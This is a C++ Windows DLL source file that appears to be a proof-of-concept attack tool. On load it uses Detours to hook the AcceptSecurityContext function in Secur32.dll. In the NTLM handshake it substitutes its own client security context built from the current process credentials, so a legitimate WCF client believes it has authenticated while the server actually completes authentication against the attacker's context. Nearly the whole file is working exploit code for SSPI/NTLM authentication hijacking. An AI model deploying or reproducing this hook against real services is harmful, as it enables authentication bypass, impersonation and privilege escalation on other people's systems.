#include "pch.h"
#include "detours.h"
#include <Windows.h>
#include <SubAuth.h>
#include <security.h>
#include <credssp.h>
#include <stdio.h>

#pragma comment(lib, "detours.lib")
#pragma comment(lib, "Secur32.lib")

typedef SECURITY_STATUS(SEC_ENTRY* pAcceptSecurityContext)(PCredHandle, PCtxtHandle, PSecBufferDesc, unsigned long, unsigned long, PCtxtHandle, PSecBufferDesc, unsigned long*, PTimeStamp);
pAcceptSecurityContext OrigAcceptSecurityContext;

CredHandle hCredClient;
TimeStamp lifetimeClient;
CtxtHandle clientContextHandle;
ULONG clientContextAttributes;
SecBufferDesc ntlmType1Desc, ntlmType2Desc, ntlmType3Desc, finalDesc;
SecBuffer ntlmType1Buffer, ntlmType2Buffer, ntlmType3Buffer, finalBuffer;

SECURITY_STATUS SEC_ENTRY
AcceptSecurityContextHijack(
	PCredHandle phCredential,               // Cred to base context
	PCtxtHandle phContext,                  // Existing context (OPT)
	PSecBufferDesc pInput,                  // Input buffer
	unsigned long fContextReq,              // Context Requirements
	unsigned long TargetDataRep,            // Target Data Rep
	PCtxtHandle phNewContext,               // (out) New context handle
	PSecBufferDesc pOutput,                 // (inout) Output buffers
	unsigned long* pfContextAttr,			// (out) Context attributes
	PTimeStamp ptsExpiry                    // (out) Life span (OPT)
)
{
	printf("[*] AcceptSecurityContext called\n");

	SECURITY_STATUS secStatus;

	if (phContext == NULL) {
		// NTLM Type 1

		ntlmType1Desc.ulVersion = 0;
		ntlmType1Desc.cBuffers = 1;
		ntlmType1Desc.pBuffers = &ntlmType1Buffer;
		ntlmType1Buffer.cbBuffer = 0;
		ntlmType1Buffer.BufferType = SECBUFFER_TOKEN;
		ntlmType1Buffer.pvBuffer = NULL;

		// Initialize a new client security context for the current user using the creds.
		// Make sure to use the same parameters as when a legitimate WCF client establishes the security context.
		secStatus = InitializeSecurityContextW(
			&hCredClient,
			NULL,
			(LPWSTR)L"localhost",
			ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY,
			0,
			TargetDataRep,
			NULL,
			0,
			&clientContextHandle,
			&ntlmType1Desc,
			&clientContextAttributes,
			&lifetimeClient);

		if (!NT_SUCCESS(secStatus)) {
			printf("[-] InitializeSecurityContext NTLM Type 1 failed: %#lx\n", secStatus);
			return secStatus;
		}

		// Call the original AcceptSecurityContext with the legitimate client input and output
		// This will make sure that the client receives the NTLM Type 2 message
		secStatus = OrigAcceptSecurityContext(
			phCredential,
			phContext,
			pInput,
			fContextReq,
			TargetDataRep,
			phNewContext,
			pOutput,
			pfContextAttr,
			ptsExpiry);


		if (!NT_SUCCESS(secStatus)) {
			printf("[-] AcceptSecurityContext NTLM Type 1 (remote client) failed: %#lx\n", secStatus);
			return secStatus;
		}

		ntlmType2Desc.ulVersion = 0;
		ntlmType2Desc.cBuffers = 1;
		ntlmType2Desc.pBuffers = &ntlmType2Buffer;
		ntlmType2Buffer.cbBuffer = 0;
		ntlmType2Buffer.BufferType = SECBUFFER_TOKEN;
		ntlmType2Buffer.pvBuffer = NULL;

		// Now call the original AcceptSecurityContext with our own client context using local input/output.
		// This will also override the previous context and state from the legitimate client while preserving
		// the legitimate client's output and state.
		secStatus = OrigAcceptSecurityContext(
			phCredential,
			phContext,
			&ntlmType1Desc,
			fContextReq | ASC_REQ_ALLOCATE_MEMORY,
			TargetDataRep,
			phNewContext,
			&ntlmType2Desc,
			pfContextAttr,
			ptsExpiry);

		if (!NT_SUCCESS(secStatus)) {
			printf("[-] AcceptSecurityContext NTLM Type 1 (local client) failed: %#lx\n", secStatus);
			return secStatus;
		}
	}
	else {
		// NTLM Type 3

		ntlmType3Desc.ulVersion = 0;
		ntlmType3Desc.cBuffers = 1;
		ntlmType3Desc.pBuffers = &ntlmType3Buffer;
		ntlmType3Buffer.cbBuffer = 0;
		ntlmType3Buffer.BufferType = SECBUFFER_TOKEN;
		ntlmType3Buffer.pvBuffer = NULL;

		// Pass the NTLM Type 2 message from the previous call to AcceptSecurityContext to our current client context
		secStatus = InitializeSecurityContextW(
			&hCredClient,
			&clientContextHandle,
			(SEC_WCHAR*)L"localhost",
			ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY,
			0,
			TargetDataRep,
			&ntlmType2Desc,
			0,
			&clientContextHandle,
			&ntlmType3Desc,
			&clientContextAttributes,
			&lifetimeClient);

		if (!NT_SUCCESS(secStatus)) {
			printf("[-] InitializeSecurityContext NTLM Type 3 failed: %#lx\n", secStatus);
			return secStatus;
		}

		// Call the original AcceptSecurityContext using the output of our own client security context as input.
		// This way, the client context completing the authentication is in fact our own client context, but the
		// legitimate client will believe it has performed the authentication.
		secStatus = OrigAcceptSecurityContext(
			phCredential,
			phContext,
			&ntlmType3Desc,
			fContextReq,
			TargetDataRep,
			phNewContext,
			pOutput,
			pfContextAttr,
			ptsExpiry);

		if (!NT_SUCCESS(secStatus)) {
			printf("[-] AcceptSecurityContext NTLM Type 3 failed: %#lx\n", secStatus);
			return secStatus;
		}
	}

	printf("[*] AcceptSecurityContext status: %#lx\n", secStatus);

	return secStatus;
}


bool InstallHook()
{
	SECURITY_STATUS secStatus;

	// Create a new client credentials handle for the current user
	secStatus = AcquireCredentialsHandleW(
		NULL,
		(LPWSTR)NTLMSP_NAME,
		SECPKG_CRED_OUTBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hCredClient,
		&lifetimeClient);

	if (!NT_SUCCESS(secStatus)) {
		printf("[-] AcquireCredentialsHandle failed: %#lx\n", secStatus);
		return false;
	}

	HMODULE secur32 = LoadLibraryW(L"Secur32.dll");
	if (secur32 == nullptr)
	{
		printf("[-] LoadLibraryW failed: %#lx\n", GetLastError());
		return false;
	}

	OrigAcceptSecurityContext = (pAcceptSecurityContext)GetProcAddress(secur32, "AcceptSecurityContext");

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	DetourAttach(&(PVOID&)OrigAcceptSecurityContext, AcceptSecurityContextHijack);

	LONG eCode = DetourTransactionCommit();
	if (eCode != NO_ERROR)
	{
		printf("[-] DetourTransactionCommit failed: %#lx\n", GetLastError());
		return false;
	}
	else
	{
		printf("[*] Hijacked SSPI\n");

		return true;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return InstallHook();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
